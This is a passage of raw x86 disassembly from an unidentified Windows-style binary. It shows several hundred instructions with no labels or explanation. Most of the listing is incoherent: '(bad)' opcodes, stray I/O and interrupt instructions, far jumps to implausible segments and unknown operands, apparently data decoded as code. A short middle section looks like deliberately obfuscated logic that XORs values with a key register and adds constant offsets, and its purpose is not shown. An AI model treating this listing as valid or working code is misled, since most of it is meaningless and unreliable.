  413146:	rcl    ch,0x16
  413149:	loope  0x4130e8
  41314b:	bound  ecx,QWORD PTR [ecx+edx*8]
  41314e:	inc    esi
  41314f:	mov    edx,0x5057fc91
  413154:	mov    edx,0x5f96f2d0
  413159:	popa   
  41315a:	cmp    ebx,DWORD PTR [ebx-0x56]
  41315d:	les    ecx,FWORD PTR [ebp+0x225836c2]
  413163:	xlat   BYTE PTR ds:[ebx]
  413164:	test   al,0xa9
  413166:	aad    0x27
  413168:	imul   edx,DWORD PTR ds:0x818fcf5,0x3846105d
  413172:	ss icebp 
  413174:	fdiv   DWORD PTR [edi-0x76f7a91]
  41317a:	add    eax,0x72f7b66c
  41317f:	mov    al,ds:0x8a39d2ef
  413184:	dec    edx
  413185:	sbb    al,0xfb
  413187:	push   es
  413188:	jg     0x413113
  41318a:	pop    es
  41318b:	popa   
  41318c:	adc    DWORD PTR [ebp-0x34b09d15],ebx
  413192:	or     al,BYTE PTR [edx+0x33]
  413195:	out    0x1b,eax
  413197:	jp     0x41318e
  413199:	outs   dx,BYTE PTR ds:[esi]
  41319a:	rcr    BYTE PTR ss:[esi-0x6bdda144],0x64
  4131a2:	or     al,0x31
  4131a4:	sahf   
  4131a5:	xchg   ebx,eax
  4131a6:	rcr    DWORD PTR [edi+0x24],cl
  4131a9:	scas   al,BYTE PTR es:[edi]
  4131aa:	fbstp  TBYTE PTR [eax-0x7a353596]
  4131b0:	inc    ebp
  4131b1:	jno    0x4131c2
  4131b3:	and    eax,0x28a08c2
  4131b8:	inc    bh
  4131ba:	push   edx
  4131bb:	and    bh,0x9e
  4131be:	iret   
  4131bf:	jecxz  0x4131f3
  4131c1:	jp     0x413217
  4131c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131c4:	push   edx
  4131c5:	ins    BYTE PTR es:[edi],dx
  4131c6:	loope  0x4131a9
  4131c8:	mov    bl,0xd8
  4131ca:	(bad)  
  4131cb:	fdivr  DWORD PTR ds:[edi]
  4131ce:	mov    DWORD PTR [eax-0x53],edi
  4131d1:	lock gs dec esi
  4131d4:	data16 aam 0x8e
  4131d7:	xchg   ecx,eax
  4131d8:	gs and eax,0x407ad73a
  4131de:	sbb    ch,BYTE PTR [esi-0x752c05f6]
  4131e4:	xor    eax,0xfbedddb8
  4131e9:	push   esp
  4131ea:	add    eax,0xd289d301
  4131ef:	sub    DWORD PTR [esi+0x7e],ebp
  4131f2:	and    esi,0x54
  4131f5:	lds    ecx,FWORD PTR [ecx-0x14]
  4131f8:	pusha  
  4131f9:	imul   BYTE PTR [edx-0x3d32fb5c]
  4131ff:	mov    DWORD PTR [edx+edx*2-0x6d737333],esi
  413206:	add    ebx,DWORD PTR [ebp-0xd]
  413209:	outs   dx,DWORD PTR ds:[esi]
  41320a:	imul   esp,DWORD PTR [ecx+0x3d5987aa],0xffffffeb
  413211:	mov    dh,0x5
  413213:	scas   al,BYTE PTR es:[edi]
  413214:	mov    eax,ds:0x580c8486
  413219:	jecxz  0x4131e4
  41321b:	nop
  41321c:	add    al,0x4e
  41321e:	retf   
  41321f:	leave  
  413220:	pop    edi
  413221:	fidiv  WORD PTR [esi+0x51]
  413224:	mov    ds:0xea332934,eax
  413229:	push   ss
  41322a:	dec    esi
  41322b:	dec    ebp
  41322c:	test   al,0xcc
  41322e:	aaa    
  41322f:	loopne 0x41324a
  413231:	and    bl,BYTE PTR [edi]
  413233:	pop    edi
  413234:	xchg   esi,eax
  413235:	cmc    
  413236:	rcl    DWORD PTR [edx-0x1c],cl
  413239:	mov    BYTE PTR [esi-0x20958d24],bl
  41323f:	cmp    DWORD PTR [ecx],0x15
  413242:	adc    DWORD PTR [ebp+0x321f52ba],ebp
  413248:	jmp    0x41327f
  41324a:	in     eax,dx
  41324b:	gs in  eax,dx
  41324d:	mov    ebx,0x941723e6
  413252:	fist   WORD PTR [ecx-0x5e76f50f]
  413258:	loope  0x413292
  41325a:	lods   eax,DWORD PTR ds:[esi]
  41325b:	daa    
  41325c:	stos   BYTE PTR es:[edi],al
  41325d:	test   eax,0x47ea83a8
  413262:	push   esp
  413263:	fs inc edx
  413265:	mov    cs,WORD PTR [edi]
  413267:	xadd   DWORD PTR [esi-0x36],ebx
  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	cwde   
  41326d:	adc    al,0x7e
  41326f:	mov    dl,0x28
  413271:	add    eax,0xf66ba189
  413276:	push   esp
  413277:	dec    ebp
  413278:	(bad)  
  41327a:	fbld   TBYTE PTR [ecx]
  41327c:	sbb    esi,DWORD PTR [esi]
  41327e:	out    dx,al
  41327f:	add    BYTE PTR [edi+0x582bc66f],al
  413285:	lea    eax,[ebp+0x4f5994e9]
  41328b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41328c:	arpl   WORD PTR ds:0xed186fe6,cx
  413292:	outs   dx,BYTE PTR ds:[esi]
  413293:	or     eax,0x8b156a29
  413298:	sbb    dl,BYTE PTR [ecx]
  41329a:	inc    ebp
  41329b:	out    0x1e,eax
  41329d:	mov    ebp,0xa4a41df2
  4132a2:	inc    edx
  4132a3:	stos   BYTE PTR es:[edi],al
  4132a4:	mov    bl,0x1e
  4132a6:	inc    edx
  4132a7:	mov    bh,al
  4132a9:	adc    DWORD PTR ds:0x4434d197,ebp
  4132af:	rcr    BYTE PTR [esi-0x4d47fc21],cl
  4132b5:	add    BYTE PTR [edx-0x2c],0xc4
  4132b9:	out    0xf3,eax
  4132bb:	xchg   esi,eax
  4132bc:	repnz loop 0x41324e
  4132bf:	iret   
  4132c0:	rcr    bl,0xe1
  4132c3:	sbb    bl,BYTE PTR [eax-0x54]
  4132c6:	scas   eax,DWORD PTR es:[edi]
  4132c7:	inc    eax
  4132c8:	pop    es
  4132c9:	fiadd  WORD PTR [eax]
  4132cb:	repz or eax,0x29e2c439
  4132d1:	mov    ebx,0x1aa9acc
  4132d6:	imul   ecx,DWORD PTR [edx+ebx*1+0x563b51c7],0xb01cb721
  4132e1:	das    
  4132e2:	mov    al,ds:0xa9123ddf
  4132e7:	jno    0x41334b
  4132e9:	xchg   DWORD PTR ds:0x702dc718,esi
  4132ef:	push   esi
  4132f0:	sbb    al,0x58
  4132f2:	push   ebp
  4132f3:	inc    esi
  4132f4:	int3   
  4132f5:	loop   0x413354
  4132f7:	cdq    
  4132f8:	jo     0x4132ec
  4132fa:	and    BYTE PTR [ebx],cl
  4132fc:	repz add eax,0xf1405a88
  413302:	and    esi,DWORD PTR [edi+0x35]
  413305:	hlt    
  413306:	dec    ebx
  413307:	sub    edi,DWORD PTR cs:[edi-0x5c]
  41330b:	sbb    al,0xb5
  41330d:	mov    ch,0x78
  41330f:	pop    edi
  413310:	and    BYTE PTR [esp+edi*2-0x21cad54c],cl
  413317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413318:	sub    eax,0xd923e63
  41331d:	pushf  
  41331e:	repnz test al,0x4b
  413321:	aaa    
  413322:	sbb    dl,bh
  413324:	sbb    esp,ebx
  413326:	inc    edx
  413327:	sbb    ch,BYTE PTR [esi]
  413329:	xchg   ebp,eax
  41332a:	les    edx,FWORD PTR [eax+0x2983e6e7]
  413330:	fild   QWORD PTR [eax]
  413332:	stos   BYTE PTR es:[edi],al
  413333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413334:	jp     0x4133b2
  413336:	lods   eax,DWORD PTR ds:[esi]
  413337:	ffreep st(1)
  413339:	pop    ebx
  41333a:	pop    esi
  41333b:	and    dl,dh
  41333d:	or     ah,BYTE PTR [ecx-0xc9d84dd]
  413343:	or     ebx,DWORD PTR [edi-0x4a]
  413346:	dec    eax
  413347:	push   esp
  413348:	mov    edi,0x791440b1
  41334d:	xor    esi,0x4e004954
  413353:	sar    DWORD PTR [ebx+0x2],cl
  413356:	(bad)  
  413357:	outs   dx,BYTE PTR ds:[esi]
  413358:	add    dl,ch
  41335a:	fidiv  WORD PTR [ecx+esi*8]
  41335d:	(bad)  
  41335e:	nop
  41335f:	jo     0x413301
  413361:	int3   
  413362:	sub    al,0x15
  413364:	mov    eax,esi
  413366:	lods   eax,DWORD PTR ds:[esi]
  413367:	int    0xa7
  413369:	xchg   BYTE PTR [ecx+0x4d],ah
  41336c:	or     cl,BYTE PTR [esi+0x5791356d]
  413372:	ja     0x41338c
  413374:	mov    esp,0x92a9a33
  413379:	fst    QWORD PTR [edi-0x76]
  41337c:	inc    ebp
  41337d:	add    DWORD PTR [edi-0x4d0e06e2],edx
  413383:	ds dec ebp
  413385:	pop    eax
  413386:	mov    eax,ds:0xa5470802
  41338b:	aad    0xd9
  41338d:	call   FWORD PTR [edx-0x2]
  413390:	hlt    
  413391:	fcomp  QWORD PTR ds:0x7603b0cc
  413397:	push   ss
  413398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413399:	repz xchg ah,dl
  41339c:	adc    edx,ecx
  41339e:	push   ebp
  41339f:	ins    DWORD PTR es:[edi],dx
  4133a0:	xlat   BYTE PTR ds:[ebx]
  4133a1:	cmp    DWORD PTR [ebx-0x1a],0x7d
  4133a5:	out    dx,al
  4133a6:	(bad)  
  4133a7:	lahf   
  4133a8:	push   edx
  4133a9:	loop   0x41337e
  4133ab:	cmp    ebp,DWORD PTR [ecx-0x4d8c259]
  4133b1:	mov    ebx,0x3f6aa3c
  4133b6:	ins    DWORD PTR es:[edi],dx
  4133b7:	daa    
  4133b8:	int3   
  4133b9:	mov    BYTE PTR [ebx+0xa],dl
  4133bc:	outs   dx,DWORD PTR ds:[esi]
  4133bd:	fidivr WORD PTR ds:0xfa259ea
  4133c3:	out    0xf1,al
  4133c5:	(bad)  
  4133c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133c7:	cmc    
  4133c8:	or     dh,ch
  4133ca:	ds sub eax,0xff95e124
  4133d0:	mov    edx,0x190806a6
  4133d5:	pop    edi
  4133d6:	ret    0x3f86
  4133d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133da:	jae    0x413416
  4133dc:	fld    TBYTE PTR [ebp-0x6ccbb0e7]
  4133e2:	test   ah,dl
  4133e4:	(bad)  
  4133e5:	sub    BYTE PTR [edi-0x4d2a63d9],dh
  4133eb:	loopne 0x413422
  4133ed:	mov    fs,WORD PTR [ecx]
  4133ef:	push   0x5
  4133f1:	shr    BYTE PTR [edi],1
  4133f3:	push   ebx
  4133f4:	fild   QWORD PTR [esi-0x5d]
  4133f7:	mov    ?,WORD PTR [edx+0x51]
  4133fa:	or     BYTE PTR [ecx],0xce
  4133fd:	xchg   al,al
  4133ff:	jecxz  0x4133d1
  413401:	pop    esi
  413402:	inc    esi
  413403:	popf   
  413404:	pop    ecx
  413405:	and    esi,DWORD PTR ds:0x5451621
  41340b:	xchg   ecx,eax
  41340c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41340d:	ja     0x4133b9
  41340f:	xor    eax,0xdbc392cf
  413414:	xchg   DWORD PTR [edi+0x23],ebx
  413417:	fnstenv [ebp-0xc]
  41341a:	pop    ss
  41341b:	shl    BYTE PTR [ecx-0xd23d2ce],0x94
  413422:	daa    
  413423:	test   eax,0xd3ffc66e
  413428:	and    DWORD PTR [esp+eax*2-0x18b7b0e3],0x31
  413430:	lock add bl,BYTE PTR [edx]
  413433:	and    BYTE PTR [esi-0x6a],cl
  413436:	push   ebx
  413437:	ins    BYTE PTR es:[edi],dx
  413438:	jno    0x413409
  41343a:	and    BYTE PTR [edi],cl
  41343c:	jecxz  0x413480
  41343e:	push   ds
  41343f:	or     cl,ch
  413441:	mov    eax,ds:0xf7ac25bc
  413446:	cmp    eax,0x10bcce3b
  41344b:	cs inc eax
  41344d:	fisub  WORD PTR [eax-0x1c]
  413450:	push   esp
  413451:	les    esp,FWORD PTR [ebp-0x46]
  413454:	mov    ch,0x7c
  413456:	fistp  QWORD PTR [ebx]
  413458:	outs   dx,BYTE PTR ds:[esi]
  413459:	stc    
  41345a:	ds shl ebx,0x66
  41345e:	sti    
  41345f:	call   0x1c21b39b
  413464:	pop    eax
  413465:	(bad)  
  413466:	sub    eax,DWORD PTR [ecx+0x1ec00fdb]
  41346c:	mov    ebx,0x7c1d359a
  413471:	pop    ebx
  413472:	inc    ebx
  413473:	stos   BYTE PTR es:[edi],al
  413474:	lods   al,BYTE PTR ds:[esi]
  413475:	inc    eax
  413476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413477:	add    ecx,DWORD PTR [esi+0x38ae432]
  41347d:	inc    edi
  41347e:	les    eax,FWORD PTR ds:0x34c6a6c
  413484:	mov    ecx,DWORD PTR [ecx-0x49ffae97]
  41348a:	int    0x8c
  41348c:	mov    BYTE PTR [edi],bh
  41348e:	sbb    ecx,edx
  413490:	mov    esp,0x9f70fb41
  413495:	dec    edi
  413496:	out    dx,eax
  413497:	out    dx,eax
  413498:	pop    ds
  413499:	push   edi
  41349a:	xchg   edi,eax
  41349b:	int    0xd2
  41349d:	inc    esp
  41349e:	das    
  41349f:	leave  
  4134a0:	fiadd  WORD PTR [esi-0x5d]
  4134a3:	mov    ch,0x55
  4134a5:	pop    ebx
  4134a6:	lea    ebx,[edx]
  4134a8:	ret    
  4134a9:	outs   dx,BYTE PTR ds:[esi]
  4134aa:	scas   al,BYTE PTR es:[edi]
  4134ab:	jecxz  0x4134ed
  4134ad:	fisub  DWORD PTR [ebx+edx*1+0x2ef43cf9]
  4134b4:	fld    QWORD PTR [eax-0x3fffe6a9]
  4134ba:	cdq    
  4134bb:	jmp    0x787:0xd7da2050
  4134c2:	fild   DWORD PTR [edi]
  4134c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134c5:	lods   eax,DWORD PTR ds:[esi]
  4134c6:	leave  
  4134c7:	xor    al,0x60
  4134c9:	retf   0xdd91
  4134cc:	jmp    0xa917:0xf296fb75
  4134d3:	(bad)  
  4134d4:	cmp    al,0x20
  4134d6:	push   ss
  4134d7:	rol    DWORD PTR [edi+0x32],1
  4134da:	pop    ebx
  4134db:	scas   al,BYTE PTR es:[edi]
  4134dc:	dec    esi
  4134dd:	fiadd  DWORD PTR [ecx+0x56]
  4134e0:	jmp    0x5946:0x4acebd4c
  4134e7:	leave  
  4134e8:	xor    esp,DWORD PTR [edi+ebp*4]
  4134eb:	cmp    al,0x88
  4134ed:	inc    eax
  4134ee:	pushf  
  4134ef:	pop    ebx
  4134f0:	xor    DWORD PTR [eax],ecx
  4134f2:	jns    0x41356b
  4134f4:	nop
  4134f5:	mov    esi,0xafe50667
  4134fa:	out    dx,al
  4134fb:	xor    ax,0x4588
  4134ff:	arpl   WORD PTR [ecx],si
  413501:	repz xchg edi,eax
  413503:	call   0x9197:0x14a084d8
  41350a:	push   esp
  41350b:	(bad)  
  41350c:	fucom  st(7)
  41350e:	mov    dh,BYTE PTR [edi-0x5e]
  413511:	xlat   BYTE PTR ds:[ebx]
  413512:	inc    edi
  413513:	jno    0x413555
  413515:	dec    eax
  413516:	pop    eax
  413517:	pop    edi
  413518:	(bad)  
  413519:	jge    0x413506
  41351b:	push   0x1caaa1e0
  413520:	imul   eax,DWORD PTR [esi-0x41f9a919],0xf
  413527:	xchg   esp,eax
  413528:	pop    edx
  413529:	shl    BYTE PTR [eax-0x6132b380],cl
  41352f:	xor    eax,DWORD PTR [eax]
  413531:	cmp    eax,0xf50ac297
  413536:	sub    edx,DWORD PTR [edi]
  413538:	pushf  
  413539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41353a:	add    al,ch
  41353c:	mov    eax,0x466f92de
  413541:	mov    bh,0xa7
  413543:	mov    edx,?
  413545:	or     ebp,esi
  413547:	and    ch,ah
  413549:	jo     0x413512
  41354b:	inc    esp
  41354c:	hlt    
  41354d:	pop    ebx
  41354e:	push   ss
  41354f:	mov    al,dh
  413551:	pop    ebx
  413552:	mov    al,ds:0x66b79390
  413557:	mov    dl,0x1a
  413559:	pop    ebx
  41355a:	(bad)  
  41355b:	jge    0x413508
  41355d:	jo     0x41353c
  41355f:	test   DWORD PTR [ecx-0x4a],edx
  413562:	cwde   
  413563:	or     BYTE PTR [edx+0x2d],bl
  413566:	cmp    esi,DWORD PTR [eax+ecx*2]
  413569:	push   ebx
  41356a:	fmul   QWORD PTR ss:[ebx]
  41356d:	cli    
  41356e:	leave  
  41356f:	xor    BYTE PTR [edx+ebp*4],ch
  413572:	push   edx
  413573:	in     eax,dx
  413574:	inc    ebp
  413575:	xchg   esi,eax
  413576:	mov    dl,BYTE PTR [ebx]
  413578:	lods   eax,DWORD PTR ds:[esi]
  413579:	or     cl,BYTE PTR [eax-0x2cc4056b]
  41357f:	hlt    
  413580:	adc    eax,0xfce48d44
  413585:	stos   BYTE PTR es:[edi],al
  413586:	push   edx
  413587:	inc    esi
  413588:	pop    ds
  413589:	bound  esi,QWORD PTR [edi]
  41358b:	sub    edi,DWORD PTR [ebx+0x69]
  41358e:	or     BYTE PTR [ebx-0x1bf44b23],cl
  413594:	pop    ss
  413595:	xchg   ecx,eax
  413596:	cmp    ch,ah
  413598:	cmp    al,0xbd
  41359a:	sub    dl,al
  41359c:	pusha  
  41359d:	add    edi,DWORD PTR ds:0x38361468
  4135a3:	fdiv   QWORD PTR [eax-0x2919131a]
  4135a9:	adc    ebx,esi
  4135ab:	pushf  
  4135ac:	mov    esp,0x61a66188
  4135b1:	enter  0xbb41,0x68
  4135b5:	push   ecx
  4135b6:	int3   
  4135b7:	xchg   ebx,eax
  4135b8:	xor    BYTE PTR [edi+0x2e409c13],al
  4135be:	std    
  4135bf:	repnz or ah,0xf
  4135c3:	lods   eax,DWORD PTR ds:[esi]
  4135c4:	push   edx
  4135c5:	xlat   BYTE PTR ds:[ebx]
  4135c6:	xchg   ebp,eax
  4135c7:	dec    edx
  4135c8:	ins    DWORD PTR es:[edi],dx
  4135c9:	mov    ebx,0xea2bf2e3
  4135ce:	jmp    0xeadc7d19
  4135d3:	dec    ecx
  4135d4:	add    eax,0xab58185a
  4135d9:	test   BYTE PTR [ebp+0x31e08004],dh
  4135df:	jae    0x4135ef
  4135e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135e2:	lods   eax,DWORD PTR ds:[esi]
  4135e3:	clc    
  4135e4:	fs add eax,esp
  4135e7:	adc    ecx,DWORD PTR [edx+0x23]
  4135ea:	sub    al,0xef
  4135ec:	imul   ebp,DWORD PTR [esi],0xffffff82
  4135ef:	mov    ecx,ss
  4135f1:	repnz out dx,al
  4135f3:	imul   edi,DWORD PTR [ebx+0x276523a7],0xd71a8c14
  4135fd:	mov    dl,0xba
  4135ff:	jecxz  0x4135fb
  413601:	mov    esi,0x75a8b0c2
  413606:	mov    eax,DWORD PTR [ebx-0x15]
  413609:	push   esp
  41360a:	stc    
  41360b:	xchg   esi,eax
  41360c:	enter  0x2f9a,0x53
  413610:	cld    
  413611:	push   eax
  413612:	xchg   edx,eax
  413613:	xor    al,bl
  413615:	sbb    bh,BYTE PTR [ecx+0x2aee49ac]
  41361b:	test   eax,0x6100cdb6
  413620:	push   esi
  413621:	xchg   DWORD PTR [ebx],ecx
  413623:	mov    cl,cl
  413625:	xchg   edi,eax
  413626:	pop    esp
  413627:	xchg   esi,eax
  413628:	dec    edx
  413629:	(bad)  
  41362a:	xchg   edx,eax
  41362b:	xchg   ecx,eax
  41362c:	fcmovbe st,st(5)
  41362e:	cli    
  41362f:	(bad)  
  413630:	rcr    DWORD PTR [esi+0x4d],cl
  413633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413634:	(bad)  
  413635:	jae    0x413688
  413637:	call   ecx
  413639:	mov    al,ds:0xb636af6a
  41363e:	in     al,0x39
  413640:	or     al,0x31
  413642:	adc    eax,DWORD PTR [eax+ecx*2]
  413645:	mov    dl,0xa0
  413647:	adc    edi,DWORD PTR [ebp+0x21569047]
  41364d:	ins    DWORD PTR es:[edi],dx
  41364e:	mov    bh,0xce
  413650:	retf   0xf680
  413653:	jb     0x413699
  413655:	pushf  
  413656:	fwait
  413657:	paddq  mm6,QWORD PTR [eax-0x411b2455]
  41365e:	jle    0x4135f9
  413660:	into   
  413661:	aas    
  413662:	call   0x1c:0x4273c52f
  413669:	jmp    0x4136e7
  41366b:	lods   al,BYTE PTR ds:[esi]
  41366c:	imul   edi,DWORD PTR [ecx],0x39fd6da4
  413672:	inc    ebp
  413673:	sbb    cl,BYTE PTR [edi+0x78]
  413676:	test   al,0x7c
  413678:	pushf  
  413679:	fisttp QWORD PTR [eax]
  41367b:	push   0x60
  41367d:	loope  0x413646
  41367f:	(bad)  
  413680:	loopne 0x41361c
  413682:	dec    esi
  413683:	(bad)  
  413684:	ror    DWORD PTR [ebp+0x38a5b3f],1
  41368a:	nop
  41368b:	and    eax,0x1d03ba8a
  413690:	test   BYTE PTR [ecx],dh
  413692:	jecxz  0x41363e
  413694:	mov    dh,0x6c
  413696:	xchg   ebx,eax
  413697:	clc    
  413698:	xor    DWORD PTR [eax-0x486f379f],ebp
  41369e:	push   esp
  41369f:	add    ch,BYTE PTR [ecx]
  4136a1:	lods   eax,DWORD PTR ds:[esi]
  4136a2:	aas    
  4136a3:	imul   ebp,ebx,0xffffffa8
  4136a6:	cmp    al,0x55
  4136a8:	fdiv   st(5),st
  4136aa:	and    al,0xcb
  4136ac:	xor    edi,esi
  4136ae:	popf   
  4136af:	cmp    ecx,eax
  4136b1:	jmp    0xf4ec39a7
  4136b6:	pop    es
  4136b7:	cmp    DWORD PTR [esi-0x654d483],0x8b38f2b1
  4136c1:	pop    ebp
  4136c2:	hlt    
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0x97
  413798:	gs push cs
  41379a:	xlat   BYTE PTR ds:[ebx]
  41379b:	mov    ds:0xcd62626b,al
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx+0x7f]
  4137a4:	imul   eax,DWORD PTR [eax],0xffffffeb
  4137a7:	xor    eax,0x253fd285
  4137ac:	lahf   
  4137ad:	nop
  4137ae:	sub    cl,BYTE PTR [ecx-0x64]
  4137b1:	inc    edx
  4137b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137b3:	inc    edi
  4137b4:	add    DWORD PTR [edx-0x916dc9a],ebp
  4137ba:	add    bh,BYTE PTR [ebx+ebp*8+0x41]
  4137be:	pop    eax
  4137bf:	cmp    DWORD PTR [ecx],ebp
  4137c1:	mov    cl,0x6d
  4137c3:	add    BYTE PTR [edx-0x2b],dl
  4137c6:	stc    
  4137c7:	in     al,dx
  4137c8:	in     eax,dx
  4137c9:	or     eax,0x54b01503
  4137ce:	push   ds
  4137cf:	xchg   ecx,eax
  4137d0:	cmp    edi,DWORD PTR [edi-0x63]
  4137d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137d4:	cmp    al,0x99
  4137d6:	xchg   edi,eax
  4137d7:	cmp    DWORD PTR [ecx+ebx*8-0x4f],edx
  4137db:	cmp    al,0x55
  4137dd:	push   esp
  4137de:	(bad)  
  4137df:	adc    eax,0x69eb6694
  4137e4:	imul   edi,DWORD PTR [esi-0x52207961],0xffffffca
  4137eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ec:	shl    DWORD PTR [eax-0x4fcda139],1
  4137f2:	jb     0x413858
  4137f4:	mov    al,0xb8
  4137f6:	mov    ds:0xe7a29ca3,al
  4137fb:	mov    bl,BYTE PTR [edi+0x6]
  4137fe:	mov    ecx,0x6ad44e61
  413803:	mov    ecx,0x84cc1a58
  413808:	dec    ecx
  413809:	mov    eax,ds:0xfe59f118
  41380e:	mov    dh,0x6e
  413810:	sahf   
  413811:	int    0xd5
  413813:	in     al,dx
  413814:	jle    0x413822
  413816:	jns    0x4137a2
  413818:	pop    ebp
  413819:	pop    ecx
  41381a:	ds add dh,dh
  41381d:	imul   ebx,DWORD PTR [esi+0x2d91416c],0x80ccb1b8
  413827:	je     0x41381b
  413829:	enter  0x1b75,0x6
  41382d:	int3   
  41382e:	pusha  
  41382f:	and    bl,BYTE PTR [edi-0x6e]
  413832:	pusha  
  413833:	stos   DWORD PTR es:[edi],eax
  413834:	jg     0x4137c0
  413836:	mov    esi,0x8804d4f5
  41383b:	jb     0x413857
  41383d:	fwait
  41383e:	jle    0x413887
  413840:	popf   
  413841:	mov    eax,0x95e0465c
  413846:	mov    esp,0x2dc0f855
  41384b:	rcl    dh,0xf4
  41384e:	ds out dx,eax
  413850:	mov    al,ds:0x60cbf139
  413855:	inc    ecx
  413856:	push   edx
  413857:	pop    edi
  413858:	sbb    eax,0x49a66986
  41385d:	mov    eax,DWORD PTR [ebp-0x25]
  413860:	loope  0x41384e
  413862:	mov    bl,0xab
  413864:	jne    0x41386e
  413866:	and    bl,al
  413868:	aaa    
  413869:	sub    DWORD PTR [esi+0x7cebffe1],esp
  41386f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413870:	jb     0x4137ff
  413872:	mov    ecx,0x332606b3
  413877:	add    BYTE PTR [ecx-0x318e75c5],bl
  41387d:	mov    esi,0x63fee75e
  413882:	sub    eax,0xdc0ed30b
  413887:	cmc    
  413888:	ficomp DWORD PTR [esi+ebx*1]
  41388b:	inc    ecx
  41388c:	(bad)  
  41388d:	adc    DWORD PTR [ebp+0x6a909ef8],esi
  413893:	fisub  WORD PTR [esp+ebp*1+0x3403131c]
  41389a:	mov    eax,0xdb739a2d
  41389f:	inc    edx
  4138a0:	into   
  4138a1:	or     eax,0xbbda5cdb
  4138a6:	jns    0x413861
  4138a8:	ja     0x41382c
  4138aa:	or     DWORD PTR [esi-0x51],edx
  4138ad:	sbb    eax,0x4f961a1c
  4138b2:	cmp    cl,ch
  4138b4:	mov    ah,0x91
  4138b6:	mov    ecx,DWORD PTR [esi-0x16]
  4138b9:	popa   
  4138ba:	add    dl,BYTE PTR [edx]
  4138bc:	in     al,0x29
  4138be:	(bad)  
  4138bf:	fdiv   QWORD PTR [ebx]
  4138c1:	inc    esi
  4138c2:	jns    0x4138f0
  4138c4:	lock adc DWORD PTR [edi],edi
  4138c7:	inc    ebx
  4138c8:	mov    bl,0xae
  4138ca:	out    0x5a,eax
  4138cc:	test   edx,ebp
  4138ce:	hlt    
  4138cf:	je     0x4138f0
  4138d1:	leave  
  4138d2:	mov    dh,0xaa
  4138d4:	iret   
  4138d5:	xor    DWORD PTR [bx+si+0x4],edi
  4138d9:	or     ah,0xc1
  4138dc:	in     eax,dx
  4138dd:	and    DWORD PTR [ebx+eax*1-0x19],ebp
  4138e1:	add    eax,0x8f6ccea4
  4138e6:	addr16 sub al,0x4
  4138e9:	lock imul esp,DWORD PTR [edx],0xffffffc3
  4138ed:	stos   DWORD PTR es:[edi],eax
  4138ee:	rcr    BYTE PTR [ecx+0x0],1
  4138f1:	(bad)  
  4138f2:	cmp    eax,0x9141c059
  4138f7:	in     al,dx
  4138f8:	cwde   
  4138f9:	jnp    0x413889
